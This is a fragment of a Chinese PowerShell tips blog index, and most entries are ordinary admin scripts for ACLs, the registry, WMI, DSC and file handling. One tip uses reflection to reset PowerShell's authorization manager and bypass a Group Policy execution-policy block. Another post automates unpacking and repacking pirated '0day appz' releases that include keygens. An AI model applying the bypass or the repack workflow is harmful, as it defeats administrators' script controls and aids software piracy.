报表中的显示","text":"当您发送信息到 Microsoft Excel 中时，它将被 .NET 内置的 ToString() 方法转化为文本。这个方法通常并不能正确地转化数组或非基本数据类型。 以下是一个例子演示这个问题。它创建了一个您系统事件日志中 10 个最近错误事件的报表： $Path = &quot;$env:temp\\$(Get-Random).csv&quot; Get-EventLog -LogName System -EntryType Error -Newest 10 | Select-Object EventID, MachineName, Data, Message, Source, ReplacementStrings, InstanceId, TimeGenerated | Export-Csv -Path $Path -Encoding UTF8 -NoTypeInformation -UseCulture Invoke-Item -Path $Path “Data”字段和“ReplacementStrings”无法使用。由于两个属性都包含数组，自动转换的结果只是简单显示数据的类型的名称。这是在从对象数据中创建 Excel 报表的常见现象。 要改进报表，您可以显式地使用 PowerShell 引擎将对象转化为文本，然后将多行文本转换为单行文本。 您可以对每个看起来不正确的字段运用这个方法。以下是上一个例子的解决方案，它能够改进 Message、Data 和 ReplacementStrings 字段的显示： $Path = &quot;$env:temp\\$(Get-Random).csv&quot; Get-EventLog -LogName System -EntryType Error -Newest 10 | Select-Object EventID, MachineName, Data, Message, Source, ReplacementStrings, InstanceId, TimeGenerated | ForEach-Object { $_.Message = ($_.Message | Out-String -Stream) -join ' ' $_.Data = ($_.Data | Out-String -Stream) -join ', ' $_.ReplacementStrings = ($_.ReplacementStrings | Out-String -Stream) -join ', ' $_ } | Export-Csv -Path $Path -Encoding UTF8 -NoTypeInformation -UseCulture Invoke-Item -Path $Path 现在所有字段都显示了正确的结果。请注意有问题的属性首先通过管道发送到 Out-String 命令（用 PowerShell 内部的机制将数据转换为有意义的文本），然后用 -join 将信息连接成单行文本。 还请注意“Message”属性是如何处理的。虽然这个属性看起来没问题，但是它实际上有可能是多行文本。多行信息在 Excel 中将只显示第一行，并以“…”结尾。我们将这些行通过空格连接之后，Excel 便可以显示完整信息了。","link":"/2014/05/14/fixing-display-in-excel-reports/"},{"title":"PowerShell 技能连载 - 批量重命名对象的属性","text":"有些时候，我们需要批量重命名对象的属性来更好地创建报表。例如，假设您获取了进程对象，你需要您可能需要以新的的列名来创建报表。 以下是一个称为 Rename-Property 的过滤器，可以用于重命名任何属性。在例子中，生成了一个进程列表，然后重命名一些属性： filter Rename-Property ([Hashtable]$PropertyMapping) { Foreach ($key in $PropertyMapping.Keys) { $_ = $_ | Add-Member -MemberType AliasProperty -Name $PropertyMapping.$key -Value $key -PassThru } $_ } $newProps = @{ Company = 'Manufacturer' Description = 'Purpose' MainWindowTitle = 'TitlebarText' } # get raw data Get-Process | # add alias properties as specified in $newProps Rename-Property $newProps | # select the properties you want to display # can be original properties and/or newly added alias properties Select-Object -Property Name, Manufacturer, Purpose, TitlebarText Rename-Property 自动加入了 $newProps 中指定的所有属性。结果对象中含有名为“Manufacturer”、“Purpose”和“TitlebarText”的新属性。您可以接着使用 Select-Object 来选择您想在报表中包含的属性。您可以从原先存在的属性中选择，也可以从新增加的别名属性中选择。 所以本质上上，属性并没有被改名（技术上不可能实现）。实际上，该过滤器以新的名字添加了别名属性，并指向原先的属性。","link":"/2014/05/15/bulk-renaming-object-properties/"},{"title":"PowerShell 技能连载 - ISE 的缺陷导致调试器阻塞","text":"在 Powershell ISE 中，有一个模糊的缺陷，可能会导致调试器死锁。受影响的 PowerShell 版本有 3.0 和 4.0。 以下是一段测试脚本： $test = @&quot; Some lines of text &quot;@ $test 在 ISE 编辑器中将这段代码保存为脚本，然后在第一行中设置一个断点：单击第一行的任何地方，然后按下 F9 键。该行将会变成红色。 当您启动脚本时，调试器将会在断点处停下，然后您可以按 F10 键单步跟踪代码。这可以正常工作。 现在，在变量定义之前加入一些空格： $test = @&quot; Some lines of text &quot;@ $test 当您现在调用调试器的时候，它将会死锁，并且 ISE 不会恢复。您还可以保存未保存的脚本，但您再也无法停止 ISE 的运行空间。 这个缺陷在对通过 here string 定义的脚本变量缩进的时候暴露出来。","link":"/2014/05/16/ise-bug-locks-debugger/"},{"title":"用 PowerShell 重新打包 0day appz","text":"从 0day 服务器下载下来的 appz 文件夹是这样的形态： 每个文件夹代表一个 appz 软件，打开是这个样子的： 里面是一系列 .zip 文件以及说明文件。这些 .zip 文件却不是使用 zip 的分卷压缩出来的，它们的内容如下： 要把这些 .zip 文件全部解压到同一个目录下，才可以得到一系列 rar 的分卷压缩文件。我们打开一个 .rar 文件，这才看到真正的内容： 软件数量大的时候，人工重复进行上述操作就不合适了。机械的劳动应该交给程序。我们可以设计一个 PowerShell 脚本，完成一系列功能： 遍历 0day appz 的下载目录。 解压所有 .zip 文件。 解压 .rar 文件。 将说明文件复制到一起。 将最终的文件重打包为 .zip 文件。 如果上述的解压有问题，则不打包，并输出错误日志。 清理临时文件。 清理成功的原始文件夹，保留失败的原始文件夹。 按照这个需求，我们可以编写如下 PowerShell 脚本： $DebugPreference = 'Continue' $incoming = 'd:\\0day\\incoming' $temp1 = 'd:\\0day\\temp1' $temp2 = 'd:\\0day\\temp2' $output = 'd:\\0day\\output' if (Test-Path $temp1) { del $temp1 -r } if (Test-Path $temp2) { del $temp2 -r } $apps = dir $incoming -Directory $count = 0 $hasFailed = $false $apps | foreach { $name = $_.Name Write-Progress -Activity 'Repacking apps' -PercentComplete ($count / $apps.Length * 100) -CurrentOperation $name echo &quot;Repacking $name&quot; md $temp1 | Out-Null md $temp2 | Out-Null # d:\\0day\\util\\7z x -o&quot;d:\\0day\\temp1&quot; &quot;d:\\0day\\incoming\\VanDyke.SecureCRT.v7.2.2.491.Incl.Patch.And.Keymaker-ZWT\\*.zip&quot; $arguments = 'x', &quot;-o&quot;&quot;$temp1&quot;&quot;&quot;, '-y', (Join-Path $_.FullName *.zip) .\\7z $arguments | Out-Null if (!$?) { Write-Warning &quot;Repacking $name failed.&quot; echo &quot;$name&quot; &gt;&gt; &quot;$output\\fail.log&quot; del $temp1 -r del $temp2 -r $count++ $hasFailed = $true return } # d:\\0day\\util\\7z x -o&quot;d:\\0day\\temp2&quot; &quot;d:\\0day\\temp1\\*.rar&quot; -y $arguments = 'x', &quot;-o&quot;&quot;$temp2&quot;&quot;&quot;, '-y', &quot;$temp1\\*.rar&quot; .\\7z $arguments | Out-Null if (!$?) { Write-Warning &quot;Repacking $name failed.&quot; echo &quot;$name&quot; &gt;&gt; &quot;$output\\fail.log&quot; del $temp1 -r del $temp2 -r $count++ $hasFailed = $true return } # copy d:\\0day\\temp1\\*.diz d:\\0day\\temp2 # copy d:\\0day\\temp1\\*.nfo d:\\0day\\temp2 dir $temp1 | where { $_.Extension -notmatch 'rar|r\\d*' } | copy -Destination $temp2 #d:\\0day\\util\\7z a &quot;d:\\0day\\output\\VanDyke.SecureCRT.v7.2.2.491.Incl.Patch.And.Keymaker-ZWT.zip&quot; &quot;d:\\0day\\temp2\\*.*&quot; -r $arguments = 'a', &quot;$output\\$name.zip&quot;, &quot;$temp2\\*.*&quot;, '-r' .\\7z $arguments | Out-Null if (!$?) { Write-Warning &quot;Repacking $name failed.&quot; echo &quot;$name&quot; &gt;&gt; &quot;$output\\fail.log&quot; del $temp1 -r del $temp2 -r $count++ $hasFailed = $true return } del $temp1 -r del $temp2 -r Remove-Item -LiteralPath $_.FullName -r $count++ } if ($hasFailed) { echo '' &gt;&gt; &quot;$output\\fail.log&quot; } echo 'Press any key to continue...' [Console]::ReadKey() | Out-Null # del 'd:\\0day\\output\\*.*' -r 您也可以在这里下载写好的脚本，包括完整的目录结构和 7z 软件包。请解压到 d:\\ 中使用，或者自行调整脚本头部的路径。","link":"/2014/05/16/repack-0day-appz-by-powershell/"},{"title":"PowerShell 技能连载 - 将文本数组转换为字符串","text":"某些时候，文本文件中的文字内容需要由其它命令来读取和处理。通常，您需要用 Get-Content 命令来读取文本文件内容，然后将结果传递给其它命令。但这有可能会失败。 以下是注意点：请牢记 Get-Content 总是返回一个文本行的数组，而不是单个文本行。所以当使用一个接收字符串而不是接收一系列文本行（字符串数组）的命令时，您需要将这些文本行转换为文本。 从 PowerShell 3.0 开始，Get-Content 拥有一个新的开关变量 -Raw。它不仅提升了读取大量文本的速度，而且一次性返回原始文本文件的整个内容，而不是将其分割成文本行。 PS&gt; $info = Get-Content $env:windir\\windowsupdate.log PS&gt; $info -is [Array] True PS&gt; $info = Get-Content $env:windir\\windowsupdate.log -Raw PS&gt; $info -is [Array] False 如果您已经有文本数组并且希望将它们转换为一个单一的文本，请使用 Out-String： PS&gt; $info = 'One', 'Two', 'Three' PS&gt; $info -is [Array] True PS&gt; $all = $info | Out-String PS&gt; $all -is [Array] False","link":"/2014/05/19/converting-text-arrays-to-string/"},{"title":"PowerShell 技能连载 - 添加或重置 NTFS 权限","text":"当您需要为一个文件添加一个新的 NTFS 存取规则，或禁用继承并添加新的规则，以下是一个示例脚本，演示这个技巧并且为您提供一个模板。 这个脚本创建一个测试文件，然后以当前用户的身份定义一个新的存取规则。这个规则包含读取和写入权限。这个新规则被添加到已存在的安全描述符中。另外，将禁用继承。 # create a sample file to apply security rules to $Path = &quot;$env:temp\\examplefile.txt&quot; $null = New-Item -Path $Path -ItemType File -ErrorAction SilentlyContinue # use current user or replace with another user name $username = &quot;$env:USERDOMAIN\\$env:USERNAME&quot; # define the new access rights $colRights = [System.Security.AccessControl.FileSystemRights]'Read, Write' $InheritanceFlag = [System.Security.AccessControl.InheritanceFlags]::None $PropagationFlag = [System.Security.AccessControl.PropagationFlags]::None $objType =[System.Security.AccessControl.AccessControlType]::Allow $objUser = New-Object System.Security.Principal.NTAccount($username) # create new access control entry $objACE = New-Object System.Security.AccessControl.FileSystemAccessRule ` ($objUser, $colRights, $InheritanceFlag, $PropagationFlag, $objType) # get existing access control list for a file or folder $objACL = Get-Acl -Path $Path # add rule $objACL.AddAccessRule($objACE) # disable inheritance (if needed) $objACL.SetAccessRuleProtection($true, $false) # apply changed access control list to file Set-Acl -Path $Path -AclObject $objACL # show file in the File Explorer explorer.exe &quot;/SELECT,$Path&quot; 执行完成之后，该脚本在文件管理器中打开测试文件，并选中它。您可以右键单击该文件并选择 属性 &gt; 安全 来查看新的设置。 要查看有哪些存取权限可用，请在 ISE 编辑器中键入以下这行： 这将自动打开上下文菜单并列出所有可用的设置。","link":"/2014/05/20/adding-and-resetting-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 编译二进制 Cmdlet","text":"PowerShell 的函数可以模拟一个真实二进制 cmdlet 的所有特性，但是 PowerShell 函数是 PowerShell 明文的代码，每个人都可以看到它的内容。 如果您是一个开发者并且有兴趣创开发二进制 cmdlet，以下是一个快速的入门。该入门演示如何用纯 PowerShell 创建并编译真正的 cmdlet： # C# definition for cmdlet $code = @' using System; using System.Collections.Generic; using System.Collections.ObjectModel; using System.Linq; using System.Text; using System.Management.Automation; namespace CustomCmdlet { [Cmdlet(&quot;Get&quot;, &quot;Magic&quot;, SupportsTransactions = false)] public class test : PSCmdlet { private int _Age; [Alias(new string[] { &quot;HowOld&quot;, &quot;YourAge&quot; }), Parameter(Position = 0,ValueFromPipeline = true)] public int Age { get { return _Age; } set { _Age = value; } } private string _Name; [Parameter(Position = 1)] public string Name { get { return _Name; } set { _Name = value; } } protected override void BeginProcessing() { this.WriteObject(&quot;Good morning...&quot;); base.BeginProcessing(); } protected override void ProcessRecord() { this.WriteObject(&quot;Your name is &quot; + Name + &quot; and your age is &quot; + Age); base.ProcessRecord(); } protected override void EndProcessing() { this.WriteObject(&quot;That's it for now.&quot;); base.EndProcessing(); } } } '@ # compile C# code to DLL # use a timestamp to create unique file names # while testing, when a DLL was imported before, it is in use until PowerShell closes # so to do repeated tests, use different DLL file names $datetime = Get-Date -Format yyyyMMddHHmmssffff $DLLPath = &quot;$env:temp\\myCmdlet($datetime).dll&quot; Add-Type -TypeDefinition $code -OutputAssembly $DLLPath # import a module Import-Module -Name $DLLPath -Verbose 现在您可以可以使用新创建的 Get-Magic cmdlet。它包含了一个 cmdlet 能实现的所有特性，包括参数、参数别名，甚至支持管道： 请注意例子中主要的 PowerShell 代码只是为了创建并编译 DLL。当 DLL 已经存在时，您需要的只是这行代码（例如，在分发的产品中）： Import-Module -Name $DLLPath 要开发复杂的二进制 cmdlet，您可能更希望在 C# 开发环境，例如 Visual Studio 中工作。您所需的只是添加 PowerShell 程序集的引用。PowerShell 程序集的路径可以用这行代码方便地获取到： 它将会把 PowerShell 程序集的路径输出到您的剪贴板中。 请注意只是编译 C# 代码并不会为您的知识资产带来更多的保护，因为它可以被反编译。所以不要用这种方式来“保护”秘密的信息，比如说密码。通过二进制 cmdlet，您可以有机会使用专业的防拷贝软件以及混淆器。额外的保护层并没有纯 PowerShell 代码的版本。","link":"/2014/05/21/compiling-binary-cmdlets/"},{"title":"PowerShell 技能连载 - 开始学习 DSC","text":"期望状态配置（DSC）是 PowerShell 4.0 中的一个新特性。通过 DSC，您可以编写简单的配置脚本并且将它们应用到本地或远程的机器上。以下是一个供您入门的示例脚本： Configuration MyConfig { # Parameters are optional param ($MachineName) # A Configuration block can have one or more Node blocks Node $MachineName { Registry RegistryExample { Ensure = 'Present' # You can also set Ensure to &quot;Absent&quot; Key = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\ExampleKey' ValueName ='TestValue' ValueData ='TestData' } } } MyConfig -MachineName $env:computername -OutputPath c:\\dsc Start-DscConfiguration -Path c:\\dsc -Wait 配置项“MyConfig”使用了“Registry”资源来确保指定的注册表项存在。您可以在 DSC 脚本中使用更多的资源，例如增加（或删除）本地用户或文件，解压一个 MSI 包或 ZIP 文件，或启动/停止一个服务等等。 运行该配置只会创建一个 MOF 文件。要应用该 MOF 文件，请使用 Start-DSCConfiguration cmdlet。请使用 -Wait 来等待配置生效。否则，该配置将会在后台以任务的方式完成。","link":"/2014/05/22/start-to-look-at-dsc/"},{"title":"PowerShell 技能连载 - 获取免费的速查表","text":"有两个很棒的 PowerShell 速查表版本。一个是由 powershellmagazine.com 创建的一系列速查表。它刚刚升级，现在覆盖了 PowerShell 4.0 并包括了一个期望状态配置（DSC）的速查表。您可以从 Microsoft 下载它： http://www.microsoft.com/en-us/download/details.aspx?id=42554 另外一个是我们的每月技巧文摘，地址如下： http://powershell.com/cs/media/28/default.aspx","link":"/2014/05/23/getting-free-cheat-sheets/"},{"title":"PowerShell 技能连载 - 检查 Windows 更新","text":"要检查 Windows 中安装的所有更新，有一个 COM 库可以帮您完成这个任务。但是这个库用起来不是很直观，而且也不支持远程。 所以我们设计了一个 PowerShell 函数，叫做 Get-WindowsUpdate。它默认情况下获取本地安装的更新，但是您也可以指定一个或多个远程计算机，并且获取它们的更新。 远程操作是借助 PowerShell 远程操作来实现的，所以只有远程计算机的 PowerShell 远程操作启用以后（例如，Windows Server 2012 默认启用 PowerShell 远程操作）才能使用，并且您需要远程计算机上的本地 Administrator 权限。 function Get-WindowsUpdate { [CmdletBinding()] param ( [String[]] $ComputerName, $Title = '*', $Description = '*', $Operation = '*' ) $code = { param ( $Title, $Description ) $Type = @{ name='Operation' expression={ switch($_.operation) { 1 {'Installed'} 2 {'Uninstalled'} 3 {'Other'} } } } $Session = New-Object -ComObject 'Microsoft.Update.Session' $Searcher = $Session.CreateUpdateSearcher() $historyCount = $Searcher.GetTotalHistoryCount() $Searcher.QueryHistory(0, $historyCount) | Select-Object Title, Description, Date, $Type | Where-Object { $_.Title -like $Title } | Where-Object { $_.Description -like $Description } | Where-Object { $_.Operation -like $Operation } } $null = $PSBoundParameters.Remove('Title') $null = $PSBoundParameters.Remove('Description') $null = $PSBoundParameters.Remove('Operation') Invoke-Command -ScriptBlock $code @PSBoundParameters -ArgumentList $Title, $Description } 这个函数也支持过滤器，所以要获得所有已安装的 Office 更新，您只需要这样做：","link":"/2014/05/26/checking-windows-updates/"},{"title":"PowerShell 技能连载 - PowerShell 上帝模式","text":"若您要运行一个 PowerShell 脚本，您必须通过执行策略的允许。通常您需要使用这行代码来允许脚本运行： 然而，如果组策略禁止了脚本执行，那么这行代码将不起作用。在这种情况下，您可以使用这段代码来重新启用允许脚本执行（单个 PowerShell 会话中有效）： $context = $executioncontext.GetType().GetField('_context','nonpublic,instance').GetValue($executioncontext) $field = $context.GetType().GetField('_authorizationManager','nonpublic,instance') $field.SetValue($context,(New-Object Management.Automation.AuthorizationManager 'Microsoft.PowerShell')) 请注意这是一种取巧的办法，它重设了认证管理器，不能保证是否有副作用。使用后果自负。 顺便说一下，这种技术不算是一个安全问题。执行策略通常不是一个安全边界。它并不是设计成用来把坏人挡在外面的。它只是为了保护您自己不做错事。所以无论您是通过 cmdlet 还是通过这段代码来启用脚本执行，您都是对自己执行 PowerShell 代码负责。","link":"/2014/05/27/powershell-god-mode/"},{"title":"PowerShell 技能连载 - 移除选定的 NTFS 权限","text":"您也许需要从 NTFS 权限中移除某些权限。我们假设您希望移除某个用户的所有权限，因为他已经离开了这个部门。 请注意：您当然可以针对每个用户组来维护 NTFS 权限，并且为每个用户设置权限通常不是个好主意。但是，常常需要针对单个用户设置权限，以下示例脚本不仅可以移除这些权限，并且通过一些小修改还能成为查找这些权限的审计工具。 以下是一个简单的示例脚本。通过设置 $Path 和 $Filter，脚本可以扫描 $Path 文件夹以及它的所有子文件夹中所有访问控制项和 $Filter 字符串相匹配的项目。它只会处理非继承的访问控制项。 输出结果中将被删除的访问控制项标记为红色如果所有访问控制项和过滤器都不匹配，则显示绿色。如果脚本没有返回任何东西，那么表示您扫描的文件夹中没有直接的访问控制项。 $Path = 'C:\\somefolder $Filter = 'S-1-5-*' Get-ChildItem -Path C:\\Obfuscated -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $acl = Get-Acl -Path $Path $found = $false foreach($acc in $acl.access ) { if ($acc.IsInherited -eq $false) { $value = $acc.IdentityReference.Value if($value -like $Filter) { Write-Host &quot;Remove $Value from $Path &quot; -ForegroundColor Red $null = $ACL.RemoveAccessRule($acc) $found = $true } else { Write-Host &quot;Skipped $Value from $Path &quot; -ForegroundColor Green } } } if ($found) { # uncomment this to actually remove ACEs # Set-Acl -Path $Path -AclObject $acl -ErrorAction Stop } }","link":"/2014/05/28/removing-selected-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 阻止非管理员权限运行脚本","text":"如果您明确知道您的脚本需要管理员权限，那么您必须在脚本的头部加上这行代码： #requires -runasadministrator 这行代码确保脚本只能在调用者用后本地管理员权限的情况下运行。这行代码不仅会试图提升脚本权限，而且会确保脚本不会启动后运行一半失败。","link":"/2014/05/29/blocking-administrator-scripts/"},{"title":"PowerShell 技能连载 - 设置注册表权限","text":"设置注册表项的权限并不是一件小事。不过通过一些技巧，并不是一件大事。 首先，运行 REGEDIT 并创建一个测试项。然后，右击该项并且使用图形界面设置您想要的权限。 然后，运行这段脚本（请将 -Path 值设为您刚才定义的注册表项）： $path = 'HKCU:\\software\\prototype' $sd = Get-Acl -Path $Path $sd.Sddl | clip 这段代码将从您的注册表项中读取安全信息并将它复制到剪贴板中。 接下来，使用这段脚本为新创建的或已有的注册表项应用相同的安全设置。只需要将这段脚本中的 SDDL 定义替换成您刚创建的值： # replace the content of this variable with the SDDL you just created $sddl = 'O:BAG:S-1-5-21-1908806615-3936657230-2684137421-1001D:PAI(A;CI;KR;;;BA)(A;CI;KA;;;S-1-5-21-1907506615-3936657230-2684137421-1001)' $Path = 'HKCU:\\software\\newkey' $null = New-Item -Path $Path -ErrorAction SilentlyContinue $sd = Get-Acl -Path $Path $sd.SetSecurityDescriptorSddlForm($sddl) Set-Acl -Path $Path -AclObject $sd 您可能需要以完整 Administrator 权限来运行这段脚本。如您所见，第一段脚本和您的测试注册表项只是用来生成 SDDL 文本。当您得到 SSDL 文本之后，您只需要将它粘贴入第二段脚本中。第二段脚本不再需要用到那个测试注册表项。","link":"/2014/05/30/setting-registry-permissions/"},{"title":"PowerShell 技能连载 - 快速获取成员身份","text":"如果您需要了解您的用户账户所在的 Active Directory 组，通常需要查询 Active Directory，并且还需要查找嵌套的组成员身份。 以下是一种快速获取您所在的组（包括嵌套的以及本地组）成员身份的方法。这段脚本查看您的存取令牌（它管理了您的各种权限）然后从您的令牌中读取所有 SID 并将 SID 转换为真实名称。 请注意您只能对当前用户使用这种技术。它很适合用作登录脚本，用来做一些基于组成员身份的操作。 [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups.Value | ForEach-Object { $sid = $_ $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid) $objUser = $objSID.Translate( [System.Security.Principal.NTAccount]) $objUser.Value }","link":"/2014/06/02/getting-group-membership-fast/"},{"title":"PowerShell 技能连载 - 用 Splatting 技术提交参数","text":"Splatting 是 PowerShell 3.0 引入的概念，但是许多用户还没有听说这个概念。这是一种以可编程的方式将参数传给 cmdlet 的技术。请看： $infos = @{} $infos.Path = 'c:\\Windows' $infos.Recurse = $true $infos.Filter = '*.log' $infos.ErrorAction = 'SilentlyContinue' $infos.Remove('Recurse') dir @infos 这个例子定义了一个包含键值对的哈希表。每个键对应 dir 命令中的一个参数，并且每个值作为实参传递给对应的形参。 当您的代码需要决定哪些参数需要传给 cmdlet 时，Splatting 十分有用。您的代码可以只需要维护一个哈希表，然后选择性地将它传给 cmdlet。","link":"/2014/06/03/submitting-parameters-through-splatting/"},{"title":"PowerShell 技能连载 - 用 Splatting 技术封装 WMI 调用","text":"Splatting 是向 cmdlet 传递多个参数的好方法。以下例子演示了如何封装 WMI 调用，并且使它们支持不同的名称： function Get-BIOSInfo { param ( $ComputerName, $Credential, $SomethingElse ) $null = $PSBoundParameters.Remove('SomethingElse') Get-WmiObject -Class Win32_BIOS @PSBoundParameters } Get-BIOSInfo 通过 WMI 获取 BIOS 信息，并且它支持本地、远程以及通过证书的远程调用。这是因为用户向 Get-BIOSInfo 传递的实参实际上传递给了 Get-WmiObject 对应的参数。所以当一个用户没有传递 -Credential 参数，那么就不会向 Get-WmiObject 传递 -Credential 参数。 Splatting 技术通常使用一个自定义的哈希表，它的每个键代表一个形参，每个值代表一个实参。在这个例子中，使用了一个预定义的 $PSBoundParameters 哈希表。它事先插入了要传递给函数的参数。 请确保不要传给目标 cmdlet 它不知道的参数。举个例子，Get-BIOSInfo 函数定义了一个“SomethingElse”参数。而 Get-WmiObject 没有这个参数，所以您在 splat 之前，您必须先调用 Remove() 方法从哈希表中把这个键移掉。","link":"/2014/06/04/use-splatting-to-encapsulate-wmi-calls/"},{"title":"PowerShell 技能连载 - 获取数据库连接字符串","text":"您是否疑惑过一个数据库的连接字符串到底长什么样？当您从控制面板中创建一个数据源时，一个向导将指引您完成整个创建过程。以下是一个利用这个向导并获取生成的连接字符串的方法。 请注意该向导的选择要依赖于您机器上所安装的数据库驱动。 function Get-ConnectionString { $Path = Join-Path -Path $env:TEMP -ChildPath 'dummy.udl' $null = New-Item -Path $Path -ItemType File -Force $CommandArg = &quot;&quot;&quot;$env:CommonProgramFiles\\System\\OLE DB\\oledb32.dll&quot;&quot;,OpenDSLFile &quot; + $Path Start-Process -FilePath Rundll32.exe -Argument $CommandArg -Wait $ConnectionString = Get-Content -Path $Path | Select-Object -Last 1 $ConnectionString | clip.exe Write-Warning 'Connection String is also available from clipboard' $ConnectionString } 当您调用 Get-ConnectionString 方法时，将会创建一个临时的 udl 文件，并且用控制面板向导打开它。您可以通过向导完成配置。配置完成之后，PowerShell 将会检测临时文件并且返回连接字符串。 它的工作原理是 Get-Process 函数带了 -Wait 参数，它能够挂起脚本的执行，直到向导退出。在向导退出以后，脚本就可以安全地访问 udl 文件了。","link":"/2014/06/05/getting-database-connection-string/"},{"title":"PowerShell 技能连载 - 远程执行 gpupdate","text":"您可以用这样的一段脚本远程执行 gpupdate.exe： function Start-GPUpdate { param ( [String[]] $ComputerName ) $code = { $rv = 1 | Select-Object -Property ComputerName, ExitCode $null = gpupdate.exe /force $rv.Exitcode = $LASTEXITCODE $rv.ComputerName = $env:COMPUTERNAME $rv } Invoke-Command -ScriptBlock $code -ComputerName $ComputerName | Select-Object -Property ComputerName, ExitCode } Start-GPUpdate 接受一个或多个计算机名，然后对每台计算机运行 gpupdate.exe，并返回执行结果。 这段脚本利用了 PowerShell 远程管理技术，所以它需要目标计算机启用了 PowerShell 远程管理，并且您需要这些机器的本地管理员权限。","link":"/2014/06/06/gpupdate-on-remote-machines/"},{"title":"PowerShell 技能连载 - 远程读取已安装的软件","text":"大多数软件都会在注册表中登记自己。以下是一段从能从本地和远程的 32 位及 64 位注册表中读取已安装的软件列表的代码。它还是一个演示如何读取远程注册表的不错的例子。 # NOTE: RemoteRegistry Service needs to run on a target system! $Hive = 'LocalMachine' # you can specify as many keys as you want as long as they are all in the same hive $Key = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall', 'SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall' # you can specify as many value names as you want $Value = 'DisplayName', 'DisplayVersion', 'UninstallString' # you can specify a remote computer name as long as the RemoteRegistry service runs on the target machine, # you have admin permissions on the target, and the firewall does not block you. Default is the local machine: $ComputerName = $env:COMPUTERNAME # add the value &quot;RegPath&quot; which will contain the actual Registry path the value came from (since you can specify more than one key) $Value = @($Value) + 'RegPath' # now for each regkey you specified... $Key | ForEach-Object { # ...open the hive on the appropriate machine $RegHive = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($Hive, $ComputerName) # ...open the key in that hive... $RegKey = $RegHive.OpenSubKey($_) # ...find names of all subkeys... $RegKey.GetSubKeyNames() | ForEach-Object { # ...open subkeys... $SubKey = $RegKey.OpenSubKey($_) # ...and read all the requested values from each subkey # ...to store them, use Select-Object to create a simple new object $returnValue = 1 | Select-Object -Property $Value $Value | ForEach-Object { $returnValue.$_ = $subkey.GetValue($_) } # ...add the current regkey path name $returnValue.RegPath = $SubKey.Name # return the values: $returnValue # close the subkey $SubKey.Close() } # close the regkey $RegKey.Close() # close the hive $RegHive.Close() } | Out-GridView","link":"/2014/06/09/reading-installed-software-remotely/"},{"title":"PowerShell 技能连载 - 从照片中读取拍摄日期","text":"如果您想重新整理您的照片库，以下这段代码能帮您从照片文件中读取拍摄日期信息。 这个例子使用了一个系统函数来查找“我的照片”的路径，然后递归搜索它的子文件夹。输出的结果通过管道传递给 Get-DataTaken，该函数返回照片的文件名、文件夹名，以及照片的拍摄时间。 function Get-DateTaken { param ( [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] [Alias('FullName')] [String] $Path ) begin { $shell = New-Object -COMObject Shell.Application } process { $returnvalue = 1 | Select-Object -Property Name, DateTaken, Folder $returnvalue.Name = Split-Path $path -Leaf $returnvalue.Folder = Split-Path $path $shellfolder = $shell.Namespace($returnvalue.Folder) $shellfile = $shellfolder.ParseName($returnvalue.Name) $returnvalue.DateTaken = $shellfolder.GetDetailsOf($shellfile, 12) $returnvalue } } $picturePath = [System.Environment]::GetFolderPath('MyPictures') Get-ChildItem -Path $picturePath -Recurse -ErrorAction SilentlyContinue | Get-DateTaken","link":"/2014/06/10/getting-datetaken-info-from-pictures/"},{"title":"PowerShell 技能连载 - 批量重命名文件","text":"假设在一个文件夹中有一大堆脚本（或照片、日志等任意文件），并且您想要重命名所有的文件。比如新文件名的格式为固定前缀 + 自增的编号。 以下是实现方法。 这个例子将重命名指定文件夹中所有扩展名为 .ps1 的 PowerShell 脚本。新文件名为 powershellscriptX.ps1，其中“X”为自增的数字。 请注意脚本禁止了真正的重命名操作。如果要真正地重命名文件，请移除 -WhatIf 参数，但必须非常小心！如果您敲错一个变量或使用了错误的文件夹路径，那么您的脚本将会十分开心地重命名成千上万个错误的文件。 $Path = 'c:\\temp' $Filter = '*.ps1' $Prefix = 'powershellscript' $Counter = 1 Get-ChildItem -Path $Path -Filter $Filter -Recurse | Rename-Item -NewName { $extension = [System.IO.Path]::GetExtension($_.Name) '{0}{1}.{2}' -f $Prefix, $script:Counter, $extension $script:Counter++ } -WhatIf","link":"/2014/06/11/bulk-file-renaming/"},{"title":"PowerShell 技能连载 - 留意副作用","text":"PowerShell 可以使用许多底层的系统函数。例如这个，可以创建一个临时文件名： [System.IO.Path]::GetTempFileName() 然而，它不仅只做这一件事。它还真实地创建了那个文件。所以如果您使用这个函数来创建临时文件名，您可能最终会在文件系统中创建一堆孤立的文件。请在您的确需要创建一个临时文件的时候才使用它。","link":"/2014/06/12/be-aware-of-side-effects/"},{"title":"PowerShell 技能连载 - 使用配置脚本","text":"您可能知道 PowerShell 支持配置脚本。只需要确保 $profile 所指定的文件存在即可。它是一个普通的脚本，每当 PowerShell 宿主启动的时候都会执行。 所以可以很方便地配置 PowerShell 环境、加载模块、增加 snap-in，以及做其它调整。这段代码将缩短您的 PowerShell 提示符，并且在标题栏显示当前路径： function prompt { 'PS&gt; ' $host.UI.RawUI.WindowTitle = Get-Location } 请注意 $profile 指定的配置脚本是和宿主有关的。每个宿主有独立的配置脚本（包括 PowerShell 控制台、ISE 编辑器以及所有的 PowerShell 宿主）。 要在所有宿主中自动执行代码，请使用这个文件： $profile.CurrentUserAllHosts 它们的路径基本上相同，除了后者文件名不含宿主名，而只是叫做“profile.ps1”。","link":"/2014/06/13/using-profile-scripts/"},{"title":"自动生成 PowerShell 技能连载","text":"Tobias Weltner 博士每个工作日都在 www.powershell.com 发布一篇 PowerShell 技能。这个系列在 PowerShell 的技术社区里已是家喻户晓，成为关注 PowerShell 技术动态的一扇窗口。 这个套技能连载在中国有两个版本的翻译。一套是由荔非苔创立的 Powershell小技巧，现由荔非苔和 CodeCook 两人维护另一套是本站的 PowerShell 技能连载。 本站是采用 JekyllBootstrap 系统搭建，使用 markdown 编辑文章，并使用 git 发布到 GitHub Pages 上。采用这些略带 geek 感的技术来做这个站点，是因为： 用 markdown 可以使我关注文案的内容，而不是格式。并且它十分适合编写技术文章。 git 很酷，可以多人协作，可以像写代码一样写文章。 